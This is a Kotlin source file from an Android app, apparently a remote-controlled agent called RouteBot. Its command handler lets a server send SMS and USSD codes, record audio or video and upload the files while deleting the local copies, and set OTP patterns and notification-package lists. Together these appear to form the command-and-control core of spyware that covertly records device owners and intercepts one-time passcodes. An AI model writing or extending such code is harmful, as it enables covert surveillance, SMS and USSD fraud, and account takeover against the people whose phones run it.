package com.routedns.routebot.command

import com.routedns.routebot.common.RouteBotLog
import com.routedns.routebot.data.remote.websocket.AgentWebSocketClient
import com.routedns.routebot.data.repository.AgentApiRepositoryImpl
import com.routedns.routebot.domain.model.CommandAckRequest
import com.routedns.routebot.domain.model.CommandStatus
import com.routedns.routebot.domain.model.CommandTypes
import com.routedns.routebot.domain.model.MediaType
import com.routedns.routebot.domain.model.RemoteCommand
import com.routedns.routebot.domain.repository.AgentApiRepository
import com.routedns.routebot.domain.repository.ConfigRepository
import com.routedns.routebot.domain.repository.SecureStorageRepository
import com.routedns.routebot.media.MediaCaptureHelper
import com.routedns.routebot.service.AgentServiceController
import com.routedns.routebot.sms.SmsHelper
import com.routedns.routebot.ussd.UssdHelper
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.launch
import kotlinx.serialization.json.Json
import kotlinx.serialization.json.JsonObject
import kotlinx.serialization.json.contentOrNull
import kotlinx.serialization.json.intOrNull
import kotlinx.serialization.json.jsonPrimitive
import javax.inject.Inject
import javax.inject.Singleton

@Singleton
class CommandExecutor @Inject constructor(
    private val agentApi: AgentApiRepository,
    private val agentApiImpl: AgentApiRepositoryImpl,
    private val configRepository: ConfigRepository,
    private val secureStorage: SecureStorageRepository,
    private val smsHelper: SmsHelper,
    private val ussdHelper: UssdHelper,
    private val mediaHelper: MediaCaptureHelper,
    private val webSocketClient: AgentWebSocketClient,
    private val serviceController: AgentServiceController,
    private val json: Json
) {
    private val scope = CoroutineScope(SupervisorJob() + Dispatchers.IO)

    fun handle(command: RemoteCommand) {
        scope.launch {
            RouteBotLog.i("command_received", mapOf("type" to command.command, "id" to command.id))
            val result = execute(command)
            agentApi.ackCommand(
                command.id,
                CommandAckRequest(
                    status = if (result.isSuccess) CommandStatus.SUCCEEDED else CommandStatus.FAILED,
                    errorMessage = result.exceptionOrNull()?.message.orEmpty()
                )
            )
        }
    }

    private suspend fun execute(command: RemoteCommand): Result<Unit> = runCatching {
        when (command.command) {
            CommandTypes.PING -> {
                webSocketClient.sendPing()
            }
            CommandTypes.SYNC -> {
                agentApiImpl.flushQueue()
            }
            CommandTypes.RESTART_SERVICES -> {
                serviceController.restartAgent()
            }
            CommandTypes.REFRESH_CONFIG -> {
                configRepository.getConfig()
            }
            CommandTypes.CLEAR_CACHE -> {
                secureStorage.clearAll()
            }
            CommandTypes.UPDATE_CONFIG -> {
                val payload = command.payload as? JsonObject
                val config = configRepository.getConfig()
                val updated = config.copy(
                    otpPatterns = payload?.get("otp_patterns")?.toString()?.let { listOf(it) }
                        ?: config.otpPatterns,
                    notificationPackages = payload?.get("notification_packages")?.toString()
                        ?.split(",")
                        ?.map { it.trim() }
                        ?.filter { it.isNotEmpty() }
                        ?: config.notificationPackages
                )
                configRepository.updateConfig(updated)
            }
            CommandTypes.SEND_SMS -> {
                val payload = command.payload as? JsonObject ?: error("payload required")
                val address = payload["address"]?.jsonPrimitive?.contentOrNull ?: error("address required")
                val body = payload["body"]?.jsonPrimitive?.contentOrNull ?: error("body required")
                val slot = payload["sim_slot"]?.jsonPrimitive?.intOrNull ?: 0
                val sent = smsHelper.sendSms(address, body, slot).getOrThrow()
                agentApi.sendSms(sent)
            }
            CommandTypes.USSD -> {
                val payload = command.payload as? JsonObject ?: error("payload required")
                val code = payload["code"]?.jsonPrimitive?.contentOrNull ?: error("code required")
                val subId = payload["subscription_id"]?.jsonPrimitive?.intOrNull
                ussdHelper.sendUssd(code, subId).getOrThrow()
            }
            CommandTypes.RECORD_AUDIO -> {
                val duration = (command.payload as? JsonObject)
                    ?.get("duration_sec")?.jsonPrimitive?.intOrNull ?: 10
                mediaHelper.startAudioRecording(duration)
                kotlinx.coroutines.delay(duration * 1000L + 500)
                val media = mediaHelper.stopRecording() ?: error("recording failed")
                uploadAndDelete(media, MediaType.AUDIO, command.id)
            }
            CommandTypes.RECORD_VIDEO -> {
                val duration = (command.payload as? JsonObject)
                    ?.get("duration_sec")?.jsonPrimitive?.intOrNull ?: 10
                mediaHelper.startVideoRecording(duration)
                kotlinx.coroutines.delay(duration * 1000L + 500)
                val media = mediaHelper.stopRecording() ?: error("recording failed")
                uploadAndDelete(media, MediaType.VIDEO, command.id)
            }
            CommandTypes.TAKE_SCREENSHOT -> {
                error("Screenshot requires MediaProjection; grant via dashboard companion flow")
            }
            else -> error("Unknown command: ${command.command}")
        }
    }.map { }

    private suspend fun uploadAndDelete(
        media: com.routedns.routebot.media.CapturedMedia,
        type: MediaType,
        commandId: String
    ) {
        agentApi.uploadMedia(type.name.lowercase(), commandId, media.file, media.contentType)
        mediaHelper.deleteAfterUpload(media.file)
    }
}
